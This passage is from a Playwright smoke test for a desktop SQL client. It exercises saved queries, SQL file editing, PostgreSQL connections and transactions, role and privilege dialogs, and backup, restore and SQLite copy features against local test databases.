  await saveDialog.getByLabel("Name").fill("Marker query");
  await page.keyboard.press("Enter");
  await panel.getByRole("status").filter({ hasText: "Saved as “Marker query”" }).waitFor();
  // Saving again offers the same name and replaces the saved SQL.
  await replaceQuery(panel, "select 'snippet_marker' as saved, 2 as version;");
  await panel.getByRole("button", { name: "Save", exact: true }).click();
  assert.equal(await page.getByRole("dialog", { name: "Save query" }).getByLabel("Name").inputValue(), "Marker query");
  await page.keyboard.press("Enter");
  await page.getByRole("button", { name: "Saved queries", exact: true }).click();
  const snippets = page.getByRole("complementary", { name: "Saved queries" });
  const markerEntry = snippets.locator(".snippet-entry", { hasText: "Marker query" });
  await markerEntry.locator(".history-sql", { hasText: "2 as version" }).waitFor();
  assert.equal(await snippets.locator(".snippet-entry").count(), 1);
  await shot("05h-saved-queries");
  await markerEntry.getByRole("button", { name: "Open" }).click();
  await snippets.waitFor({ state: "detached" });
  assert.equal(await panel.locator(".cm-content").innerText(), "select 'snippet_marker' as saved, 2 as version;");
  await page.getByRole("button", { name: "Saved queries", exact: true }).click();
  await markerEntry.getByText("Organize", { exact: true }).click();
  await markerEntry.getByRole("button", { name: "Delete", exact: true }).click();
  const deleteSaved = page.getByRole("dialog", { name: "Delete “Marker query”?" });
  assert.equal(await deleteSaved.getByRole("button", { name: "Cancel" }).evaluate((button) => button === document.activeElement), true);
  await deleteSaved.getByRole("button", { name: "Delete", exact: true }).click();
  await snippets.getByText("No saved queries yet.", { exact: false }).waitFor();
  await page.getByRole("button", { name: "Close saved queries" }).click();

  step("SQL files: Ctrl+O opens one, the unsaved marker, Ctrl+S keeps its encoding and line endings, a change on disk asks, save as, closing asks, recent files");
  {
    const sqlDir = join(userDir, "sql files");
    mkdirSync(sqlDir, { recursive: true });
    const reportPath = join(sqlDir, "report.sql");
    // UTF-8 with a byte order mark and Windows line endings: both kept when saved.
    writeFileSync(reportPath, "﻿select 'file_marker' as f;\r\nselect 2;\r\n");
    const fileTab = (name) => page.locator(".tabbar .tab").filter({ has: page.locator(".tab-label", { hasText: new RegExp(`^${name.replace(".", "\\.")}$`) }) });
    const shownPanel = page.locator(".tab-panel:not([hidden])");
    const editorLines = async () => (await shownPanel.locator(".cm-line").evaluateAll((lines) => lines.map((l) => l.textContent))).join("\n");
    // The native open dialog cannot be driven: src/dialogs.ts takes this path instead.
    await page.evaluate((path) => { window.__spelaionOpenPath = path; }, reportPath);
    await page.keyboard.press("Control+o");
    await fileTab("report.sql").waitFor();
    assert.equal(await editorLines(), "select 'file_marker' as f;\nselect 2;\n");
    assert.equal(await fileTab("report.sql").locator(".tab-unsaved").count(), 0);
    // Opening it again shows the same tab.
    await page.keyboard.press("Control+o");
    await page.waitForTimeout(300);
    assert.equal(await fileTab("report.sql").count(), 1);
    await shownPanel.locator(".cm-content").click();
    await page.keyboard.press("Control+End");
    await page.keyboard.insertText("-- edited");
    await fileTab("report.sql").locator(".tab-unsaved").waitFor();
    await shot("05i-sql-file-unsaved");
    await page.keyboard.press("Control+s");
    await fileTab("report.sql").locator(".tab-unsaved").waitFor({ state: "detached" });
    assert.equal(readFileSync(reportPath, "utf8"), "﻿select 'file_marker' as f;\r\nselect 2;\r\n-- edited");
    // Someone changes the file: saving over it asks; reloading takes theirs.
    writeFileSync(reportPath, "select 'theirs';\n");
    await page.keyboard.insertText(" again");
    await fileTab("report.sql").locator(".tab-unsaved").waitFor();
    await page.keyboard.press("Control+s");
    const changed = page.getByRole("dialog", { name: "report.sql changed on disk" });
    await changed.waitFor();
    await shot("05j-sql-file-changed-on-disk");
    await changed.getByRole("button", { name: "Reload from disk" }).click();
    await changed.waitFor({ state: "detached" });
    await fileTab("report.sql").locator(".tab-unsaved").waitFor({ state: "detached" });
    assert.equal(await editorLines(), "select 'theirs';\n");
    assert.equal(readFileSync(reportPath, "utf8"), "select 'theirs';\n");
    // Save as (Ctrl+Shift+S): the tab now shows the new file, written in the old one's format.
    const copyPath = join(sqlDir, "copy.sql");
    await page.evaluate((path) => { window.__spelaionSavePath = path; }, copyPath);
    await shownPanel.locator(".cm-content").click();
    await page.keyboard.press("Control+Shift+S");
    await fileTab("copy.sql").waitFor();
    assert.equal(await fileTab("report.sql").count(), 0);
    assert.equal(readFileSync(copyPath, "utf8"), "select 'theirs';\n");
    // A console saved as a file becomes a file tab.
    const consolePath = join(sqlDir, "console.sql");
    await page.keyboard.press("Control+t");
    await shownPanel.locator(".cm-content").click();
    await page.keyboard.insertText("select 'from_console';\nselect 3;");
    await page.evaluate((path) => { window.__spelaionSavePath = path; }, consolePath);
    await page.keyboard.press("Control+Shift+S");
    await fileTab("console.sql").waitFor();
    // A new file: UTF-8 without a BOM, the platform's line break.
    assert.equal(readFileSync(consolePath, "utf8"), process.platform === "win32" ? "select 'from_console';\r\nselect 3;" : "select 'from_console';\nselect 3;");
    await page.evaluate(() => { delete window.__spelaionSavePath; delete window.__spelaionOpenPath; });
    // Closing a file tab with unsaved changes asks: Cancel keeps it, Don't save closes it.
    await shownPanel.locator(".cm-content").click();
    await page.keyboard.press("Control+End");
    await page.keyboard.insertText(" -- not kept");
    await page.keyboard.press("Control+w");
    const unsaved = page.getByRole("dialog", { name: "Save the changes to console.sql?" });
    await unsaved.waitFor();
    await shot("05k-sql-file-close-unsaved");
    await unsaved.getByRole("button", { name: "Cancel", exact: true }).click();
    await unsaved.waitFor({ state: "detached" });
    assert.equal(await fileTab("console.sql").count(), 1);
    await page.keyboard.press("Control+w");
    await unsaved.getByRole("button", { name: "Don't save" }).click();
    await fileTab("console.sql").waitFor({ state: "detached" });
    assert.ok(!readFileSync(consolePath, "utf8").includes("not kept"));
    // Reopening the closed tab brings it back as it was closed: unsaved changes included.
    await page.keyboard.press("Control+Shift+T");
    await fileTab("console.sql").locator(".tab-unsaved").waitFor();
    await page.keyboard.press("Control+w");
    await unsaved.getByRole("button", { name: "Don't save" }).click();
    await fileTab("console.sql").waitFor({ state: "detached" });
    // Recent files: newest first, from the tab bar's file button; one already open shows its tab.
    await page.getByRole("button", { name: "Open a file or a recent one" }).click();
    const fileMenu = page.getByRole("menu", { name: "Open a file or a recent one" });
    await fileMenu.getByRole("menuitem", { name: /^console\.sql/ }).waitFor();
    const recentNames = await fileMenu.locator(".recent-file button[role=menuitem] > span:first-child").allInnerTexts();
    assert.deepEqual(recentNames.slice(0, 3), ["console.sql", "copy.sql", "report.sql"]);
    await shot("05l-recent-files");
    await fileMenu.getByRole("menuitem", { name: /^copy\.sql/ }).click();
    await page.locator(".tabbar .tab.active .tab-label", { hasText: "copy.sql" }).waitFor();
    await page.getByRole("button", { name: "Open a file or a recent one" }).click();
    await fileMenu.getByRole("menuitem", { name: /^report\.sql/ }).click();
    await fileTab("report.sql").waitFor();
    assert.equal(await editorLines(), "select 'theirs';\n");
    // Both saved: closing them asks nothing.
    await page.keyboard.press("Control+w");
    await fileTab("report.sql").waitFor({ state: "detached" });
    await fileTab("copy.sql").click();
    await page.keyboard.press("Control+w");
    await fileTab("copy.sql").waitFor({ state: "detached" });
  }

  step("direct PostgreSQL: password asked in a dialog");
  panel = await newQuery(
    "Postgres (Docker)",
    "select id, txt, ts, amount, flag, maybe_null, uid, doc\nfrom big\norder by id\nlimit 1000;",
  );
  await run(panel);
  await page.getByRole("dialog").getByText("Password for Postgres (Docker)").waitFor();
  // A wrong password first: it is asked again showing the reason.
  await page.getByLabel("Password", { exact: true }).fill("wrong");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await page.getByRole("dialog").getByText("password authentication failed").waitFor();
  await shot("06-wrong-password");
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".statusline", { hasText: "1,000 rows" }).waitFor();
  await shot("07-postgres");

  step("PostgreSQL visual plan: actual core tree, graph, raw output and execution warning");
  await replaceQuery(panel, "select 1 as plan_smoke_value;");
  await panel.getByRole("button", { name: "Explain query", exact: true }).click();
  const planView = panel.getByRole("region", { name: "Execution plan", exact: true });
  await planView.getByText("Estimates only", { exact: false }).waitFor();
  await planView.getByRole("button", { name: "Tree & table", exact: true }).click();
  await planView.locator('.plan-table [data-node-id="0"]').waitFor();
  assert.match(await planView.locator(".plan-table").innerText(), /Result/);
  await planView.getByRole("button", { name: "Graph", exact: true }).click();
  await planView.locator('.plan-graph-node[data-node-id="0"]').waitFor();
  await planView.getByRole("button", { name: "Raw output", exact: true }).click();
  await planView.locator(".plan-raw pre").filter({ hasText: '"Node Type": "Result"' }).waitFor();
  await planView.getByLabel("ANALYZE", { exact: true }).check();
  await planView.getByRole("button", { name: "Explain query", exact: true }).click();
  await page.getByRole("dialog").getByText("ANALYZE executes your query", { exact: true }).waitFor();
  await page.getByRole("dialog").getByRole("button", { name: "Execute and analyze", exact: true }).click();
  await planView.getByText("Actual execution", { exact: false }).waitFor();
  await shot("07-plan-overview");
  await planView.getByRole("button", { name: "Back to results", exact: true }).click();
  await planView.waitFor({ state: "detached" });

  step("a session the server ended: shown as lost, nothing re-run, reconnected on a click");
  await replaceQuery(panel, "select pg_terminate_backend(pg_backend_pid());");
  await run(panel);
  const lost = panel.locator(".status-lost");
  await lost.waitFor();
  assert.match(await lost.innerText(), /Connection lost/);
  // Running again does not reconnect on its own: it says why.
  await replaceQuery(panel, "select 'after reconnect' as marker;");
  await run(panel);
  await panel.getByText("The connection was lost", { exact: false }).first().waitFor();
  assert.equal(await panel.locator(".status-lost").count(), 1);
  await shot("07a-connection-lost");
  await lost.getByRole("button", { name: "Reconnect" }).click();
  // The prompted password lived with the lost session: it is asked again.
  const passwordDialog = page.getByRole("dialog").getByText("Password for Postgres (Docker)");
  await passwordDialog.waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".status-connected").waitFor();
  await panel.getByText("Reconnected. Nothing was run again.", { exact: true }).waitFor();
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();

  step("transactions: auto-commit off, the TX badge, Rollback and Commit, and closing asks first");
  // ADR-031: the core keeps the tab's transaction; the toolbar and the tab only show it.
  const autoCommit = panel.locator(".transaction-controls").getByRole("checkbox", { name: "Auto-commit" });
  assert.ok(await autoCommit.isChecked());
  await replaceQuery(panel, "create temp table tx_smoke (id int);");
  await run(panel);
  await panel.getByText("Statement 1: OK", { exact: false }).first().waitFor();
  assert.equal(await panel.locator(".tx-badge").count(), 0, "auto-commit leaves no transaction open");
  // The switch shows what the core answers, so it changes once the core has done it.
  await autoCommit.click();
  await panel.locator(".transaction-controls input[type=checkbox]:not(:checked)").waitFor();
  await panel.getByRole("button", { name: "Commit", exact: true }).waitFor();
  await replaceQuery(panel, "insert into tx_smoke values (1);\ninsert into tx_smoke values (2);");
  await run(panel);
  await panel.locator(".tx-badge", { hasText: "TX open · 2" }).waitFor();
  await page.locator(".tabbar .tab.active .tab-tx").waitFor();
  // Auto-commit cannot come back on while the transaction is open: commit or roll back first.
  assert.ok(await autoCommit.isDisabled());
  await shot("07b-transaction-open");
  await panel.getByRole("button", { name: "Rollback", exact: true }).click();
  await panel.getByText("Transaction rolled back.", { exact: false }).waitFor();
  await panel.locator(".tx-badge").waitFor({ state: "detached" });
  assert.equal(await page.locator(".tabbar .tab.active .tab-tx").count(), 0);
  await replaceQuery(panel, "insert into tx_smoke values (3);");
  await run(panel);
  await panel.locator(".tx-badge", { hasText: "TX open · 1" }).waitFor();
  await panel.getByRole("button", { name: "Commit", exact: true }).click();
  await panel.getByText("Transaction committed.", { exact: false }).waitFor();
  await panel.locator(".tx-badge").waitFor({ state: "detached" });
  // Closing the tab with a transaction open asks first; Cancel keeps it.
  await replaceQuery(panel, "delete from tx_smoke where id = 3;");
  await run(panel);
  await panel.locator(".tx-badge", { hasText: "TX open · 1" }).waitFor();
  // The badge comes with the statement's transaction state, before the run is marked finished:
  // the run's duration shows once it is (SDB-253). The dialog lists the tab once either way.
  await panel.locator(".statusline", { hasText: /\d ms$/ }).waitFor();
  await page.locator(".tabbar .tab.active .close").click();
  const closeOpen = page.getByRole("dialog", { name: "Close with an open transaction?" });
  await closeOpen.getByText("the server rolls back what was not committed", { exact: false }).waitFor();
  assert.equal(await closeOpen.locator(".risk-list li").count(), 1);
  await shot("07c-close-open-transaction");
  // Cancel has the focus: a reflex Enter keeps the tab.
  await page.keyboard.press("Enter");
  await closeOpen.waitFor({ state: "detached" });
  await panel.locator(".tx-badge").waitFor();
  // Switching the tab's connection asks too.
  await panel.locator(".toolbar select").first().selectOption({ label: "Shop (SQLite) (sqlite)" });
  const switchOpen = page.getByRole("dialog", { name: "Disconnect with an open transaction?" });
  await switchOpen.getByRole("button", { name: "Cancel", exact: true }).click();
  await switchOpen.waitFor({ state: "detached" });
  await panel.locator(".tx-badge").waitFor();
  // A session lost with a transaction open says so; nothing reconnects or re-runs.
  await replaceQuery(panel, "select pg_terminate_backend(pg_backend_pid());");
  await run(panel);
  const lostOpen = panel.locator(".status-lost");
  await lostOpen.getByText("A transaction was open", { exact: false }).waitFor();
  assert.equal(await page.locator(".tabbar .tab.active .tab-tx").count(), 0);
  await shot("07d-lost-with-transaction");
  await lostOpen.getByRole("button", { name: "Reconnect" }).click();
  await page.getByRole("dialog").getByText("Password for Postgres (Docker)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".status-connected").waitFor();
  // A new session starts from its type's default: auto-commit.
  await autoCommit.waitFor();
  assert.ok(await autoCommit.isChecked());

  step("accounts: a new role with its password masked, locked and dropped from the explorer");
  // ADR-048. The core writes the SQL with '***' in place of the password; it runs as shown.
  {
    await page.locator('.connection-row:has-text("Postgres (Docker)") .twisty').click();
    await page.getByRole("dialog").getByText("Password for Postgres (Docker)").waitFor();
    await page.getByLabel("Password", { exact: true }).fill("spelaion");
    await page.getByRole("button", { name: "Connect", exact: true }).click();
    const pgNode = page.locator('.node:has(> .connection-row:has-text("Postgres (Docker)"))');
    const rolesFolder = pgNode.getByRole("button", { name: "Expand or collapse Roles", exact: true });
    await rolesFolder.click({ button: "right" });
    await page.getByRole("menuitem", { name: "New role…" }).click();
    const newRole = page.getByRole("dialog", { name: "New role" });
    await newRole.getByLabel("Name", { exact: true }).fill("smoke_account");
    await newRole.getByLabel("Password", { exact: true }).fill("Smoke'secret-1");
    await newRole.getByLabel("Repeat the password", { exact: true }).fill("Smoke'secret-2");
    await newRole.getByText("The passwords do not match", { exact: false }).waitFor();
    assert.ok(await newRole.getByRole("button", { name: "Create", exact: true }).isDisabled());
    await newRole.getByLabel("Repeat the password", { exact: true }).fill("Smoke'secret-1");
    await newRole.getByLabel("Can create databases").check();
    await newRole.getByLabel("SQL that will run").filter({ hasText: "CREATE ROLE smoke_account WITH LOGIN CREATEDB PASSWORD '***';" }).waitFor();
    assert.ok(!(await newRole.innerText()).includes("Smoke'secret"), "the dialog never shows the password");
    // A script that sets a password cannot be opened in the editor.
    assert.equal(await newRole.getByRole("button", { name: "Open in editor" }).count(), 0);
    await shot("sdb-25-new-role");
    const themeBeforeRole = await page.evaluate(() => { const theme = document.documentElement.dataset.theme; document.documentElement.dataset.theme = "dark"; return theme; });
    await shot("sdb-25-new-role-dark");
    await page.evaluate((theme) => { if (theme === undefined) delete document.documentElement.dataset.theme; else document.documentElement.dataset.theme = theme; }, themeBeforeRole);
    await newRole.getByRole("button", { name: "Create", exact: true }).click();
    await newRole.waitFor({ state: "detached" });
    if ((await rolesFolder.getAttribute("aria-expanded")) !== "true") await rolesFolder.click();
    const roleRow = pgNode.locator(".leaf-row", { hasText: "smoke_account" });
    await roleRow.waitFor();
    await roleRow.click({ button: "right" });
    // The menu stays inside the window, moved up when the row is near the bottom of the explorer.
    {
      const accountMenu = await page.locator(".object-menu").boundingBox();
      const view = await page.evaluate(() => ({ width: window.innerWidth, height: window.innerHeight }));
      assert.ok(
        accountMenu.x >= 0 && accountMenu.y >= 0 && accountMenu.x + accountMenu.width <= view.width && accountMenu.y + accountMenu.height <= view.height,
        `the account menu is inside the window: ${JSON.stringify({ accountMenu, view })}`,
      );
      await shot("sdb-246-account-menu");
      const themeBeforeMenu = await page.evaluate(() => { const theme = document.documentElement.dataset.theme; document.documentElement.dataset.theme = "dark"; return theme; });
      await shot("sdb-246-account-menu-dark");
      await page.evaluate((theme) => { if (theme === undefined) delete document.documentElement.dataset.theme; else document.documentElement.dataset.theme = theme; }, themeBeforeMenu);
    }
    await page.getByRole("menuitem", { name: "Lock or unlock…" }).click();
    const lockRole = page.getByRole("dialog", { name: "Lock or unlock smoke_account" });
    await lockRole.getByText("It is not locked now.").waitFor();
    await lockRole.getByLabel("SQL that will run").filter({ hasText: "ALTER ROLE smoke_account WITH NOLOGIN;" }).waitFor();
    await shot("sdb-25-lock");
    await lockRole.getByRole("button", { name: "Lock", exact: true }).click();
    await lockRole.waitFor({ state: "detached" });
    await roleRow.click({ button: "right" });
    await page.getByRole("menuitem", { name: "Change password…" }).click();
    const passwordRole = page.getByRole("dialog", { name: "Change the password of smoke_account" });
    await passwordRole.getByLabel("New password", { exact: true }).fill("Smoke-new-2");
    await passwordRole.getByLabel("Repeat the password", { exact: true }).fill("Smoke-new-2");
    await passwordRole.getByLabel("SQL that will run").filter({ hasText: "ALTER ROLE smoke_account WITH PASSWORD '***';" }).waitFor();
    await shot("sdb-25-password");
    const themeBeforePassword = await page.evaluate(() => { const theme = document.documentElement.dataset.theme; document.documentElement.dataset.theme = "dark"; return theme; });
    await shot("sdb-25-password-dark");
    await page.evaluate((theme) => { if (theme === undefined) delete document.documentElement.dataset.theme; else document.documentElement.dataset.theme = theme; }, themeBeforePassword);
    await passwordRole.getByRole("button", { name: "Change password", exact: true }).click();
    await passwordRole.waitFor({ state: "detached" });
    // Privileges: what it has, read by the core; a grant written by the core from the form, and a
    // revoke from the row it shows.
    await roleRow.click({ button: "right" });
    await page.getByRole("menuitem", { name: "Privileges…" }).click();
    const privileges = page.getByRole("dialog", { name: "Privileges of smoke_account" });
    await privileges.getByText("No privileges or roles of its own.").waitFor();
    assert.equal(await privileges.getByLabel("On", { exact: true }).inputValue(), "database");
    await privileges.getByLabel("Database", { exact: true }).fill("spelaion");
    await privileges.getByRole("group", { name: "Privileges" }).getByLabel("CONNECT").check();
    await privileges.getByLabel("SQL that will run").filter({ hasText: "GRANT CONNECT ON DATABASE spelaion TO smoke_account;" }).waitFor();
    await privileges.getByRole("button", { name: "Grant", exact: true }).click();
    await privileges.getByRole("status").filter({ hasText: "Granted." }).waitFor();
    const revokeConnect = privileges.getByRole("button", { name: "Revoke CONNECT on spelaion…" });
    await revokeConnect.waitFor();
    await shot("sdb-25-privileges");
    const themeBeforePrivileges = await page.evaluate(() => { const theme = document.documentElement.dataset.theme; document.documentElement.dataset.theme = "dark"; return theme; });
    await shot("sdb-25-privileges-dark");
    await page.evaluate((theme) => { if (theme === undefined) delete document.documentElement.dataset.theme; else document.documentElement.dataset.theme = theme; }, themeBeforePrivileges);
    await revokeConnect.click();
    await privileges.getByLabel("SQL that will run").filter({ hasText: "REVOKE CONNECT ON DATABASE spelaion FROM smoke_account;" }).waitFor();
    await privileges.getByRole("button", { name: "Revoke", exact: true }).click();
    await privileges.getByText("No privileges or roles of its own.").waitFor();
    // Default privileges of tables created later in a schema, revoked from the row, which names
    // the role that creates them.
    await privileges.getByRole("radio", { name: "Grant", exact: true }).check();
    await privileges.getByLabel("On", { exact: true }).selectOption("default_tables");
    await privileges.getByLabel("Schema", { exact: true }).fill("public");
    await privileges.getByRole("group", { name: "Privileges" }).getByLabel("SELECT", { exact: true }).check();
    await privileges.getByLabel("SQL that will run").filter({ hasText: "ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO smoke_account;" }).waitFor();
    await privileges.getByRole("button", { name: "Grant", exact: true }).click();
    await privileges.getByRole("status").filter({ hasText: "Granted." }).waitFor();
    const revokeDefault = privileges.getByRole("button", { name: "Revoke SELECT on schema public, created by spelaion…" });
    await revokeDefault.waitFor();
    await shot("sdb-229-default-privileges");
    const themeBeforeDefaults = await page.evaluate(() => { const theme = document.documentElement.dataset.theme; document.documentElement.dataset.theme = "dark"; return theme; });
    await shot("sdb-229-default-privileges-dark");
    await page.evaluate((theme) => { if (theme === undefined) delete document.documentElement.dataset.theme; else document.documentElement.dataset.theme = theme; }, themeBeforeDefaults);
    await revokeDefault.click();
    await privileges.getByLabel("SQL that will run").filter({ hasText: "ALTER DEFAULT PRIVILEGES FOR ROLE spelaion IN SCHEMA public REVOKE SELECT ON TABLES FROM smoke_account;" }).waitFor();
    await privileges.getByRole("button", { name: "Revoke", exact: true }).click();
    await privileges.getByText("No privileges or roles of its own.").waitFor();
    // Some columns of a table: the core names them after each privilege.
    await privileges.getByRole("radio", { name: "Grant", exact: true }).check();
    await privileges.getByLabel("On", { exact: true }).selectOption("column");
    await privileges.getByLabel("Schema", { exact: true }).fill("public");
    await privileges.getByLabel("Table", { exact: true }).fill("orders");
    await privileges.getByLabel("Columns", { exact: true }).fill("id, Total");
    await privileges.getByRole("group", { name: "Privileges" }).getByLabel("SELECT", { exact: true }).check();
    await privileges.getByRole("group", { name: "Privileges" }).getByLabel("UPDATE", { exact: true }).check();
    await privileges.getByLabel("SQL that will run").filter({ hasText: "GRANT SELECT (id, \"Total\"), UPDATE (id, \"Total\") ON TABLE public.orders TO smoke_account;" }).waitFor();
    await shot("sdb-229-column-privileges");
    const themeBeforeColumns = await page.evaluate(() => { const theme = document.documentElement.dataset.theme; document.documentElement.dataset.theme = "dark"; return theme; });
    await shot("sdb-229-column-privileges-dark");
    await page.evaluate((theme) => { if (theme === undefined) delete document.documentElement.dataset.theme; else document.documentElement.dataset.theme = theme; }, themeBeforeColumns);
    await privileges.getByRole("button", { name: "Close", exact: true }).click();
    await privileges.waitFor({ state: "detached" });
    // Delete on the row asks to drop it; Cancel has the focus.
    await roleRow.focus();
    await page.keyboard.press("Delete");
    const dropRole = page.getByRole("dialog", { name: "Drop smoke_account?" });
    await dropRole.getByLabel("SQL that will run").filter({ hasText: "DROP ROLE smoke_account;" }).waitFor();
    await shot("sdb-25-drop");
    await dropRole.getByRole("button", { name: "Drop", exact: true }).click();
    await roleRow.waitFor({ state: "detached" });
  }

  step("backup and restore: the vendor's tools found or reported missing, a live log, a confirmed restore (ADR-049)");
  {
    // The explorer opened Postgres (Docker) in the accounts step: its menu has the backups.
    const noTools = join(userDir, "no-db-tools");
    const backups = join(userDir, "backups");
    mkdirSync(noTools, { recursive: true });
    mkdirSync(backups, { recursive: true });
    // Real client tools only when the machine has them (SPELAION_SMOKE_DB_TOOLS: their folder).
    const realTools = process.env.SPELAION_SMOKE_DB_TOOLS ?? null;
    // The settings dialog cannot open over this one: the screenshots switch the theme directly.
    const setThemeKeepingDialog = (theme) => page.evaluate((value) => { document.documentElement.dataset.theme = value; }, theme);

    await (await connectionMenu("Postgres (Docker)")).getByRole("menuitem", { name: "Back up…" }).click();
    const backupDialog = page.getByRole("dialog", { name: "Back up Postgres (Docker)" });
    await backupDialog.waitFor();
    // A folder without the tools: the core says which one is missing and where it looked.
    await backupDialog.getByLabel("Folder of the client tools", { exact: true }).fill(noTools);
    await backupDialog.getByText(/pg_dump was not found/).waitFor();
    await backupDialog.getByLabel("Folder", { exact: true }).fill(backups);
    await backupDialog.getByText(/Could not prepare the backup: pg_dump was not found/).waitFor();
    assert.ok(await backupDialog.getByRole("button", { name: "Back up", exact: true }).isDisabled());
    // Tar archives have no compression level. (A select's name ends with its chosen option.)
    const format = backupDialog.getByRole("combobox", { name: /^Format/ });
    await format.selectOption("tar");
    assert.ok(await backupDialog.getByRole("combobox", { name: /^Compression/ }).isDisabled());
    await format.selectOption("custom");
    await shot("sdb-20-backup-missing-tools-light");
    await setThemeKeepingDialog("dark");
    await shot("sdb-20-backup-missing-tools-dark");
    await setThemeKeepingDialog("light");
    if (realTools) {
      await backupDialog.getByLabel("Folder of the client tools", { exact: true }).fill(realTools);
      await backupDialog.locator(".backup-path").waitFor();
      await backupDialog.getByRole("button", { name: "Back up", exact: true }).click();
      await backupDialog.getByText(/^Backed up /).waitFor({ timeout: 120_000 });
      const log = await backupDialog.getByRole("log", { name: "Tool output" }).textContent();
      assert.ok(log.includes("--dbname="), "the command line is shown");
      assert.ok(!log.includes("spelaion@") && !/password=spelaion/i.test(log), "no password in the log");
      await shot("sdb-20-backup-log-light");
      await setThemeKeepingDialog("dark");
      await shot("sdb-20-backup-log-dark");
      await setThemeKeepingDialog("light");
    }
    await backupDialog.getByRole("button", { name: "Close", exact: true }).click();
    await backupDialog.waitFor({ state: "detached" });

    await (await connectionMenu("Postgres (Docker)")).getByRole("menuitem", { name: "Restore…" }).click();
    const restoreDialog = page.getByRole("dialog", { name: "Restore into Postgres (Docker)" });
    await restoreDialog.waitFor();
    const sqlFile = join(userDir, "smoke-restore.sql");
    writeFileSync(sqlFile, "CREATE TABLE IF NOT EXISTS smoke_restored (id int);\n");
    await restoreDialog.getByLabel("Folder of the client tools", { exact: true }).fill(noTools);
    await page.evaluate((path) => { window.__spelaionOpenPath = path; }, sqlFile);
    await restoreDialog.getByRole("button", { name: "Choose file…" }).click();
    await page.evaluate(() => { delete window.__spelaionOpenPath; });
    assert.equal(await restoreDialog.getByLabel("Backup file", { exact: true }).inputValue(), sqlFile);
    await restoreDialog.getByRole("button", { name: "Restore…", exact: true }).click();
    await restoreDialog.getByText(/Could not prepare the restore: psql was not found/).waitFor();
    await restoreDialog.getByRole("list", { name: "Client tools" }).getByText(/psql was not found/).waitFor();
    await shot("sdb-20-restore-missing-tools-light");
    await setThemeKeepingDialog("dark");
    await shot("sdb-20-restore-missing-tools-dark");
    await setThemeKeepingDialog("light");
    if (realTools) {
      await restoreDialog.getByLabel("Folder of the client tools", { exact: true }).fill(realTools);
      await restoreDialog.getByText("psql (PostgreSQL)", { exact: false }).waitFor();
      await restoreDialog.getByRole("button", { name: "Restore…", exact: true }).click();
      // The confirmation names the file and the tool, and Cancel has the focus.
      const confirm = page.getByRole("dialog", { name: /^Restore into .*\?$/ });
      await confirm.waitFor();
      await confirm.getByText("psql runs the file's backslash commands", { exact: false }).waitFor();
      await page.waitForFunction(() => document.activeElement?.textContent === "Cancel");
      await shot("sdb-20-restore-confirm-light");
      await setThemeKeepingDialog("dark");
      await shot("sdb-20-restore-confirm-dark");
      await setThemeKeepingDialog("light");
      await confirm.getByRole("button", { name: "Restore", exact: true }).click();
      await restoreDialog.getByText(/^Restored in /).waitFor({ timeout: 120_000 });
      await shot("sdb-20-restore-log");
    }
    await restoreDialog.getByRole("button", { name: "Close", exact: true }).click();
    await restoreDialog.waitFor({ state: "detached" });
  }

  step("SQLite copy with VACUUM INTO, and an .sql file run with its confirmation and progress (ADR-049)");
  {
    const setThemeKeepingDialog = (theme) => page.evaluate((value) => { document.documentElement.dataset.theme = value; }, theme);
    const copies = join(userDir, "sqlite-copies");
    mkdirSync(copies, { recursive: true });
    await (await connectionMenu("Shop (SQLite)")).getByRole("menuitem", { name: "Back up…" }).click();
    const copyDialog = page.getByRole("dialog", { name: "Back up Shop (SQLite)" });
    await copyDialog.waitFor();
    assert.equal(await copyDialog.getByRole("list", { name: "Client tools" }).count(), 0, "SQLite needs no client tools");
    await copyDialog.getByLabel("Folder", { exact: true }).fill(copies);
    await copyDialog.locator(".backup-path").filter({ hasText: ".sqlite" }).waitFor();
    await copyDialog.getByRole("button", { name: "Back up", exact: true }).click();
    await copyDialog.getByText(/^Backed up /).waitFor({ timeout: 60_000 });
    assert.ok((await copyDialog.getByRole("log", { name: "Tool output" }).textContent()).includes("VACUUM INTO"));
    assert.ok(readdirSync(copies).some((name) => name.endsWith(".sqlite")), "the copy was written");
    assert.ok(!readdirSync(copies).some((name) => name.endsWith(".part")));
    await shot("sdb-20-sqlite-copy-light");
    await copyDialog.getByRole("button", { name: "Close", exact: true }).click();
    await copyDialog.waitFor({ state: "detached" });
    // A SQLite copy is a database of its own: there is no Restore… for it.
    const shopMenu = await connectionMenu("Shop (SQLite)");
    assert.equal(await shopMenu.getByRole("menuitem", { name: "Restore…" }).count(), 0);
    await shopMenu.getByRole("menuitem", { name: "Run SQL file…" }).click();
    const runDialog = page.getByRole("dialog", { name: "Run a SQL file on Shop (SQLite)" });
    await runDialog.waitFor();
    const sqlFile = join(userDir, "smoke-run.sql");
    const lines = ["create table smoke_run (id integer primary key, name text);"];
    for (let i = 1; i <= 200; i++) lines.push(`insert into smoke_run (name) values ('row ${i}');`);
    lines.push("drop table smoke_run;");
    writeFileSync(sqlFile, lines.join("\n") + "\n");
    await page.evaluate((path) => { window.__spelaionOpenPath = path; }, sqlFile);
    await runDialog.getByRole("button", { name: "Choose file…" }).click();
    await page.evaluate(() => { delete window.__spelaionOpenPath; });
    await runDialog.getByText("202 statements,", { exact: false }).waitFor();
    await runDialog.getByRole("button", { name: "Run…", exact: true }).click();
    const confirmRun = page.getByRole("dialog", { name: "Run smoke-run.sql?" });
    await confirmRun.waitFor();
    // The editor's guard would ask about the DROP: the confirmation says so; Cancel has the focus.
    await confirmRun.getByRole("list", { name: "Statements the editor would ask about" }).getByText("DROP", { exact: false }).waitFor();
    await page.waitForFunction(() => document.activeElement?.textContent === "Cancel");
    await shot("sdb-20-run-file-confirm-light");
    await setThemeKeepingDialog("dark");
    await shot("sdb-20-run-file-confirm-dark");
    await setThemeKeepingDialog("light");
    await confirmRun.getByRole("button", { name: "Run file", exact: true }).click();
    await runDialog.getByText(/^Ran 202 statements in /).waitFor({ timeout: 60_000 });
    await shot("sdb-20-run-file-done-light");
    await setThemeKeepingDialog("dark");
    await shot("sdb-20-run-file-done-dark");
